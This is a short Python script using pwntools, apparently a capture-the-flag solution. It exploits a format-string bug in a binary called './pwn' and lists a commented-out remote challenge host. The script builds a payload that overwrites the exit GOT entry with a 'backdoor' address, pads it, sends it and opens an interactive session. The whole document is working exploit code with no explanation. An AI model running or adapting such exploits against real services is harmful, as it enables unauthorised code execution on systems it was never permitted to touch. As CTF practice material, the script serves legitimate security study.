from pwn import *
context(arch='amd64', os='linux', log_level='debug')
p = process('./pwn')
#p = remote('challenge.bluesharkinfo.com',22338)
backdoor = 0x40125B
offset = 8
p.recvuntil(b'Have fun')
exit_got = 0x4033A0
payload = fmtstr_payload(offset, {exit_got: backdoor}, write_size='short')
if len(payload) <= 32:
        payload += b'A' * (33 - len(payload))
p.send(payload)        
p.interactive()
